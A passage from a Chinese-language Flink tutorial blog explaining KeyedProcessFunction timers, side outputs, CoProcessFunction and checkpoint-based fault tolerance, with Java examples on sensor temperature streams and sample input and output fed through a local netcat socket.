7777</span><br></pre></td></tr></table></figure><p>输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718207,36.3</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8</span><br><span class="line">1612283803911 定时器触发</span><br></pre></td></tr></table></figure><h4 id="TimerService和定时器-Timers"><a href="#TimerService和定时器-Timers" class="headerlink" title="TimerService和定时器(Timers)"></a>TimerService和定时器(Timers)</h4><pre><code>Context 和OnTimerContext 所持有的TimerService 对象拥有以下方法：</code></pre><ul><li> <code>long currentProcessingTime()</code> 返回当前处理时间 </li><li> <code>long currentWatermark()</code> 返回当前watermark 的时间戳 </li><li> <code>void registerProcessingTimeTimer( long timestamp)</code> 会注册当前key的processing time的定时器。当processing time 到达定时时间时，触发timer。 </li><li> <code>**void registerEventTimeTimer(long timestamp)**</code>** 会注册当前key 的event time 定时器。当Watermark水位线大于等于定时器注册的时间时，触发定时器执行回调函数。** </li><li> <code>void deleteProcessingTimeTimer(long timestamp)</code> 删除之前注册处理时间定时器。如果没有这个时间戳的定时器，则不执行。 </li><li> <code>void deleteEventTimeTimer(long timestamp)</code> 删除之前注册的事件时间定时器，如果没有此时间戳的定时器，则不执行。 </li></ul><pre><code>**当定时器timer 触发时，会执行回调函数onTimer()。注意定时器timer 只能在keyed streams 上面使用。**</code></pre><h5 id="测试代码-4"><a href="#测试代码-4" class="headerlink" title="测试代码"></a>测试代码</h5><p>下面举个例子说明KeyedProcessFunction 如何操作KeyedStream。</p><p>需求：监控温度传感器的温度值，如果温度值在10 秒钟之内(processing time)连续上升，则报警。</p><ul><li><p> java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> processfunction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.KeyedProcessFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/3 1:02 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProcessTest2_ApplicationCase</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 创建执行环境</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    <span class="comment">// 设置并行度为1</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 从socket中获取数据</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line">    <span class="comment">// 转换数据为SensorReading类型</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; sensorReadingStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// 如果存在连续10s内温度持续上升的情况，则报警</span></span><br><span class="line">    sensorReadingStream.keyBy(SensorReading::getId)</span><br><span class="line">      .process(<span class="keyword">new</span> TempConsIncreWarning(Time.seconds(<span class="number">10</span>).toMilliseconds()))</span><br><span class="line">      .print();</span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果存在连续10s内温度持续上升的情况，则报警</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">TempConsIncreWarning</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">String</span>, <span class="title">SensorReading</span>, <span class="title">String</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TempConsIncreWarning</span><span class="params">(Long interval)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.interval = interval;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 报警的时间间隔(如果在interval时间内温度持续上升，则报警)</span></span><br><span class="line">    <span class="keyword">private</span> Long interval;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 上一个温度值</span></span><br><span class="line">    <span class="keyword">private</span> ValueState&lt;Double&gt; lastTemperature;</span><br><span class="line">    <span class="comment">// 最近一次定时器的触发时间(报警时间)</span></span><br><span class="line">    <span class="keyword">private</span> ValueState&lt;Long&gt; recentTimerTimeStamp;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      lastTemperature = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Double&gt;(<span class="string">&quot;lastTemperature&quot;</span>, Double.class));</span><br><span class="line">      recentTimerTimeStamp = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Long&gt;(<span class="string">&quot;recentTimerTimeStamp&quot;</span>, Long.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      lastTemperature.clear();</span><br><span class="line">      recentTimerTimeStamp.clear();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(SensorReading value, Context ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// 当前温度值</span></span><br><span class="line">      <span class="keyword">double</span> curTemp = value.getTemperature();</span><br><span class="line">      <span class="comment">// 上一次温度(没有则设置为当前温度)</span></span><br><span class="line">      <span class="keyword">double</span> lastTemp = lastTemperature.value() != <span class="keyword">null</span> ? lastTemperature.value() : curTemp;</span><br><span class="line">      <span class="comment">// 计时器状态值(时间戳)</span></span><br><span class="line">      Long timerTimestamp = recentTimerTimeStamp.value();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果 当前温度 &gt; 上次温度 并且 没有设置报警计时器，则设置</span></span><br><span class="line">      <span class="keyword">if</span> (curTemp &gt; lastTemp &amp;&amp; <span class="keyword">null</span> == timerTimestamp) &#123;</span><br><span class="line">        <span class="keyword">long</span> warningTimestamp = ctx.timerService().currentProcessingTime() + interval;</span><br><span class="line">        ctx.timerService().registerProcessingTimeTimer(warningTimestamp);</span><br><span class="line">        recentTimerTimeStamp.update(warningTimestamp);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 如果 当前温度 &lt; 上次温度，且 设置了报警计时器，则清空计时器</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (curTemp &lt;= lastTemp &amp;&amp; timerTimestamp != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ctx.timerService().deleteProcessingTimeTimer(timerTimestamp);</span><br><span class="line">        recentTimerTimeStamp.clear();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 更新保存的温度值</span></span><br><span class="line">      lastTemperature.update(curTemp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定时器任务</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// 触发报警，并且清除 定时器状态值</span></span><br><span class="line">      out.collect(<span class="string">&quot;传感器&quot;</span> + ctx.getCurrentKey() + <span class="string">&quot;温度值连续&quot;</span> + interval + <span class="string">&quot;ms上升&quot;</span>);</span><br><span class="line">      recentTimerTimeStamp.clear();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>启动本地socket，之后输入数据  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lk 7777</span><br></pre></td></tr></table></figure><ul><li><p> 输入  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_1,1547718199,34.1</span><br><span class="line">sensor_1,1547718199,34.2</span><br><span class="line">sensor_1,1547718199,35.1</span><br><span class="line">sensor_6,1547718201,15.4</span><br><span class="line">sensor_7,1547718202,6.7</span><br><span class="line">sensor_10,1547718205,38.1</span><br><span class="line">sensor_10,1547718205,39  </span><br><span class="line">sensor_6,1547718201,18  </span><br><span class="line">sensor_7,1547718202,9.1</span><br></pre></td></tr></table></figure></li><li><p> 输出  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">传感器sensor_1温度值连续10000ms上升</span><br><span class="line">传感器sensor_10温度值连续10000ms上升</span><br><span class="line">传感器sensor_6温度值连续10000ms上升</span><br><span class="line">传感器sensor_7温度值连续10000ms上升</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="侧输出流（SideOutput）"><a href="#侧输出流（SideOutput）" class="headerlink" title="侧输出流（SideOutput）"></a>侧输出流（SideOutput）</h4><ul><li><strong>一个数据可以被多个window包含，只有其不被任何window包含的时候(包含该数据的所有window都关闭之后)，才会被丢到侧输出流。</strong></li><li><strong>简言之，如果一个数据被丢到侧输出流，那么所有包含该数据的window都由于已经超过了”允许的迟到时间”而关闭了，进而新来的迟到数据只能被丢到侧输出流！</strong></li></ul><hr><ul><li> 大部分的DataStream API 的算子的输出是单一输出，也就是某种数据类型的流。除了split 算子，可以将一条流分成多条流，这些流的数据类型也都相同。 </li><li> <strong>processfunction 的side outputs 功能可以产生多条流，并且这些流的数据类型可以不一样。</strong> </li><li> 一个side output 可以定义为OutputTag[X]对象，X 是输出流的数据类型。 </li><li> processfunction 可以通过Context 对象发射一个事件到一个或者多个side outputs。 </li></ul><h5 id="测试代码-5"><a href="#测试代码-5" class="headerlink" title="测试代码"></a>测试代码</h5><p>场景：温度&gt;=30放入高温流输出，反之放入低温流输出</p><ul><li><p> java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> processfunction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.ProcessFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.OutputTag;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/3 2:07 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProcessTest3_SideOuptCase</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 创建执行环境</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    <span class="comment">// 设置并行度 = 1</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 从本地socket读取数据</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line">    <span class="comment">// 转换成SensorReading类型</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个OutputTag，用来表示侧输出流低温流</span></span><br><span class="line">    <span class="comment">// An OutputTag must always be an anonymous inner class</span></span><br><span class="line">    <span class="comment">// so that Flink can derive a TypeInformation for the generic type parameter.</span></span><br><span class="line">    OutputTag&lt;SensorReading&gt; lowTempTag = <span class="keyword">new</span> OutputTag&lt;SensorReading&gt;(<span class="string">&quot;lowTemp&quot;</span>)&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 测试ProcessFunction，自定义侧输出流实现分流操作</span></span><br><span class="line">    SingleOutputStreamOperator&lt;SensorReading&gt; highTempStream = dataStream.process(<span class="keyword">new</span> ProcessFunction&lt;SensorReading, SensorReading&gt;() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(SensorReading value, Context ctx, Collector&lt;SensorReading&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 判断温度，大于30度，高温流输出到主流；小于低温流输出到侧输出流</span></span><br><span class="line">        <span class="keyword">if</span> (value.getTemperature() &gt; <span class="number">30</span>) &#123;</span><br><span class="line">          out.collect(value);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          ctx.output(lowTempTag, value);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    highTempStream.print(<span class="string">&quot;high-temp&quot;</span>);</span><br><span class="line">    highTempStream.getSideOutput(lowTempTag).print(<span class="string">&quot;low-temp&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>本地启动socket </p><ul><li><p> 输入  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_6,1547718201,15.4</span><br><span class="line">sensor_7,1547718202,6.7</span><br><span class="line">sensor_10,1547718205,38.1</span><br></pre></td></tr></table></figure></li><li><p> 输出  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">high-temp&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_1&#x27;</span>, timestamp=1547718199, temperature=35.8&#125;</span></span><br><span class="line"><span class="meta">low-temp&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_6&#x27;</span>, timestamp=1547718201, temperature=15.4&#125;</span></span><br><span class="line"><span class="meta">low-temp&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_7&#x27;</span>, timestamp=1547718202, temperature=6.7&#125;</span></span><br><span class="line"><span class="meta">high-temp&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_10&#x27;</span>, timestamp=1547718205, temperature=38.1&#125;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="CoProcessFunction"><a href="#CoProcessFunction" class="headerlink" title="CoProcessFunction"></a>CoProcessFunction</h4><ul><li> 对于两条输入流，DataStream API 提供了CoProcessFunction 这样的low-level操作。CoProcessFunction 提供了操作每一个输入流的方法: <code>processElement1()</code>和<code>processElement2()</code>。 </li><li> <strong>类似于ProcessFunction，这两种方法都通过Context 对象来调用</strong>。这个Context对象可以访问事件数据，定时器时间戳，TimerService，以及side outputs。 </li><li> <strong>CoProcessFunction 也提供了onTimer()回调函数</strong>。 </li></ul><h3 id="容错机制"><a href="#容错机制" class="headerlink" title="容错机制"></a>容错机制</h3><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106433621">Flink-容错机制 | 一致性检查点 | 检查点到恢复状态过程 | Flink检查点算法(Chandy-Lamport) | 算法操作解析 | 保存点简介</a></p></blockquote><h4 id="一致性检查点-checkpoint"><a href="#一致性检查点-checkpoint" class="headerlink" title="一致性检查点(checkpoint)"></a>一致性检查点(checkpoint)</h4><p><img src="https://img-blog.csdnimg.cn/2020052922013278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=cWV43&originHeight=318&originWidth=514&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> Flink 故障恢复机制的核心，就是应用状态的一致性检查点 </li><li> 有状态流应用的一致检查点，其实就是<strong>所有任务的状态</strong>，在某个时间点的一份拷贝（一份快照）；<strong>这个时间点，应该是所有任务都恰好处理完一个相同的输入数据的时候</strong><br><em>(5这个数据虽然进了奇数流但是偶数流也应该做快照，因为属于同一个相同数据，只是没有被他处理)</em><br><em>（这里根据奇偶性分流，偶数流求偶数和，奇数流求奇数和，5这里明显已经被sum_odd（1+3+5）处理了，且sum_even不需要处理该数据，因为前面已经判断该数据不需要到sum_even流，相当于所有任务都已经处理完source的数据5了。）</em> </li><li> 在JobManager中也有个Chechpoint的指针，指向了仓库的状态快照的一个拓扑图，为以后的数据故障恢复做准备 </li></ul><h4 id="从检查点恢复状态"><a href="#从检查点恢复状态" class="headerlink" title="从检查点恢复状态"></a>从检查点恢复状态</h4><p><img src="https://img-blog.csdnimg.cn/20200529220326395.png###id=Y7K5x&originHeight=186&originWidth=579&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> 在执行流应用程序期间，Flink 会定期保存状态的一致检查点 </li><li> 如果发生故障， Flink 将会使用最近的检查点来一致恢复应用程序的状态，并重新启动处理流程<br>（<strong>如图中所示，7这个数据被source读到了，准备传给奇数流时，奇数流宕机了，数据传输发生中断</strong>） </li></ul><p><img src="https://img-blog.csdnimg.cn/20200529220452315.png###id=TC1ql&originHeight=179&originWidth=590&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> 遇到故障之后，第一步就是重启应用<br>(<strong>重启后，起初流都是空的</strong>) </li></ul><p><img src="https://img-blog.csdnimg.cn/20200529220546658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=DIQul&originHeight=335&originWidth=590&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> 第二步是从 checkpoint 中读取状态，将状态重置<br><em>(<strong>读取在远程仓库</strong>(Storage，这里的仓库指状态后端保存数据指定的三种方式之一)<strong>保存的状态</strong>)</em> </li><li> 从检查点重新启动应用程序后，其内部状态与检查点完成时的状态完全相同 </li></ul><p><img src="https://img-blog.csdnimg.cn/20200529220850257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=YEVg0&originHeight=205&originWidth=533&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> 第三步：开始消费并处理检查点到发生故障之间的所有数据 </li><li> <strong>这种检查点的保存和恢复机制可以为应用程序状态提供“精确一次”（exactly-once）的一致性，因为所有算子都会保存检查点并恢复其所有状态，这样一来所有的输入流就都会被重置到检查点完成时的位置</strong><br><em>（这里要求source源也能记录状态，回退到读取数据7的状态，kafka有相应的偏移指针能完成该操作）</em> </li></ul><h4 id="Flink检查点算法"><a href="#Flink检查点算法" class="headerlink" title="Flink检查点算法"></a>Flink检查点算法</h4><h5 id="概述-3"><a href="#概述-3" class="headerlink" title="概述"></a>概述</h5><p><strong>checkpoint和Watermark一样，都会以广播的形式告诉所有下游。</strong></p><hr><ul><li> 一种简单的想法<br>暂停应用，保存状态到检查点，再重新恢复应用（当然Flink 不是采用这种简单粗暴的方式） </li><li>Flink的改进实现 <ul><li>基于Chandy-Lamport算法的分布式快照</li><li>将检查点的保存和数据处理分离开，不暂停整个应用</li></ul></li></ul><p>（就是每个任务单独拍摄自己的快照到内存，之后再到jobManager整合） </p><hr><ul><li>检查点分界线（Checkpoint Barrier） <ul><li>Flink的检查点算法用到了一种称为分界线（barrier）的特殊数据形式，用来把一条流上数据按照不同的检查点分开</li><li><strong>分界线之前到来的数据导致的状态更改，都会被包含在当前分界线所属的检查点中；而基于分界线之后的数据导致的所有更改，就会被包含在之后的检查点中</strong></li></ul></li></ul><h5 id="具体讲解"><a href="#具体讲解" class="headerlink" title="具体讲解"></a>具体讲解</h5><p><img src="https://img-blog.csdnimg.cn/20200529224034243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=jgnx2&originHeight=307&originWidth=637&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> 现在是一个有两个输入流的应用程序，用并行的两个 Source 任务来读取 </li><li> 两条自然数数据流，蓝色数据流已经输出完<code>蓝3</code>了，黄色数据流输出完<code>黄4</code>了 </li><li> 在Souce端 Source1 接收到了数据<code>蓝3</code> 正在往下游发向一个数据<code>蓝2 和 蓝3</code>； Source2 接受到了数据<code>黄4</code>，且往下游发送数据<code>黄4</code> </li><li> 偶数流已经处理完<code>黄2</code> 所以后面显示为2， 奇数流处理完<code>蓝1 和 黄1 黄3</code> 所以为5，并分别往下游发送每次聚合后的结果给Sink </li></ul><p><img src="https://img-blog.csdnimg.cn/20200529224517502.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=qsxI1&originHeight=281&originWidth=681&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> <strong>JobManager 会向每个 source 任务发送一条带有新检查点 ID 的消息</strong>，通过这种方式来启动检查点<br><em>（这个带有新检查点ID的东西为<strong>barrier</strong>，由图中三角型表示，数值2只是ID）</em> </li></ul><p><img src="https://img-blog.csdnimg.cn/20200529224705177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=hhECw&originHeight=330&originWidth=604&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>数据源将它们的状态写入检查点，并发出一个检查点barrier</li><li>状态后端在状态存入检查点之后，会返回通知给source任务，source任务就会向JobManager确认检查点完成</li></ul><pre><code>_上图，在Source端接受到barrier后，将自己此身的3 和 4 的数据的状态写入检查点，且向JobManager发送checkpoint成功的消息，然后向下游分别发出一个检查点 barrier__可以看出在Source接受barrier时，数据流也在不断的处理，不会进行中断__此时的偶数流已经处理完_`_蓝2_`_变成了4，但是还没处理到_`_黄4_`_，只是下游sink发送了一个数据4，而奇数流已经处理完_`_蓝3_`_变成了8（黄1+蓝1+黄3+蓝3），并向下游sink发送了8__此时检查点barrier都还未到Sum_odd奇数流和Sum_even偶数流_</code></pre><p><img 